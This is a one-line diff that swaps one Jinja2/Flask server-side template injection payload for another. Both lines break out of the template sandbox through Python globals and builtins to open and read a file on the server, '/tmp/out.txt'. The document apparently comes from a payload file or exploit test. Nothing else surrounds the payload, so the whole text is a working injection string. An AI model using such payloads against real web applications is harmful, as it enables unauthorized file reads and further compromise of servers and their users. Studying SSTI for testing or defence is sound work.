@@ -1,1 +1,1 @@
-{{url_for.__globals__['__builtins__'].open('/tmp/out.txt').read()}}
+{{config.__class__.__init__.__globals__['__builtins__'].open('/tmp/out.txt').read()}}
